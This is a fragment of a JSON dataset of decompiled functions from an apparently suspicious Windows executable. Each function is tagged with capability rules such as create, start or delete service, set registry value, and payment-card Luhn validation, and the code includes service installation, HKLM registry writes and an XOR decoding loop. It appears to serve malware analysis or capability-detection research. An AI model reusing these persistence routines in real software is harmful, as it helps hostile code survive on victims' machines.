        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402ece) overlaps instruction at (ram,0x00402ecd)\n// \n// WARNING: Removing unreachable block (ram,0x00402ec0)\n// WARNING: Removing unreachable block (ram,0x00402eca)\n// WARNING: Removing unreachable block (ram,0x00402ece)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00402e90(uint *param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar uStack108;\n    uint uStack107;\n    uint uStack8;\n    \n    uStack8 = 0;\n    uStack108 = 0;\n    puVar2 = &uStack107;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00402bd0(&uStack108, &uStack8);\n    fcn.00402f20(&uStack108, uStack8, 0x407028, 0xa160);\n    *param_1 = 0x407028;\n    *param_2 = 0xa160;\n    return;\n}\n",
        "token_count": 315
    },
    "00402f20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402f25) overlaps instruction at (ram,0x00402f24)\n// \n// WARNING: Removing unreachable block (ram,0x00402f67)\n// WARNING: Removing unreachable block (ram,0x00402f74)\n// WARNING: Removing unreachable block (ram,0x00402f25)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402f20(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    \n    uVar2 = 0;\n    if (arg_14h != 0) {\n        do {\n            uVar1 = *(uVar2 + arg_10h) ^ *(uVar2 % arg_ch + arg_8h);\n            if ((-1 < uVar1) && (-1 >= uVar1)) {\n                *(arg_10h + 0x1c) = in_ST0;\n                arg_10h = arg_10h + 5;\n                uVar2 = uVar2 + 5;\n                in_ST0 = in_ST1;\n                in_ST1 = in_ST2;\n                in_ST2 = in_ST3;\n                in_ST3 = in_ST4;\n                in_ST4 = in_ST5;\n                in_ST5 = in_ST6;\n                in_ST6 = in_ST7;\n            }\n            *(uVar2 + arg_10h) = uVar1;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 445
    },
    "00402fb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402fb0(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00403770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool fcn.00403770(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.00401000(&var_4h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x411350, 0x411390, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 259
    },
    "00403820": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403820(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 102
    },
    "00404720": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00404759)\n// WARNING: Removing unreachable block (ram,0x00404766)\n\nuint __cdecl fcn.00404720(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iVar1;\n    uint var_8h;\n    uint var_ch;\n    \n    arg_ch_00 = var_ch;\n    arg_8h_00 = var_8h;\n    iVar1 = fcn.00401d50(var_8h, var_ch, &var_8h, &var_ch);\n    if (iVar1 != 0) {\n        *(iVar1 + 0x58) = var_ch;\n        fcn.00401d50(arg_8h_00, arg_ch_00, &var_8h, &var_ch);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 239
    },
    "004050a0": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00405123)\n// WARNING: Removing unreachable block (ram,0x0040512b)\n// WARNING: Removing unreachable block (ram,0x004050f5)\n\nuint32_t __cdecl fcn.004050a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint32_t *in_EAX;\n    int32_t iVar1;\n    bool in_CF;\n    uint hKey;\n    \n    if ((!in_CF) && (in_CF)) {\n        if (&stack0xfffffff4 < *in_EAX || in_EAX + 1U == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(1, 0xb7f8c08b);\n        return in_EAX + 1U;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 != 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    return iVar1 == 0;\n}\n",
        "token_count": 357
    },
    "00401200": {
        "rules": [
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401200(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint8_t extraout_CL;\n    uint8_t extraout_DL;\n    bool bVar3;\n    bool bVar4;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    bVar3 = extraout_CL < extraout_DL;\n    bVar4 = extraout_CL == 1;\n    uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n    if ((!bVar3 && !bVar4) && (bVar3 || bVar4)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return uVar2;\n}\n",
        "token_count": 225
    },
    "004016a0": {
        "rules": [
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004016a0(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EDI;\n    bool in_SF;\n    float10 in_ST0;\n    \n    if ((!in_SF) && (in_SF)) {\n        *(unaff_EDI + 0x1c) = in_ST0;\n    }\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 295
    },
    "004042b0": {
        "rules": [
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004042b0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 139
    },
    "00401280": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00401280(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x411350, 0x411394, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 77
    }
}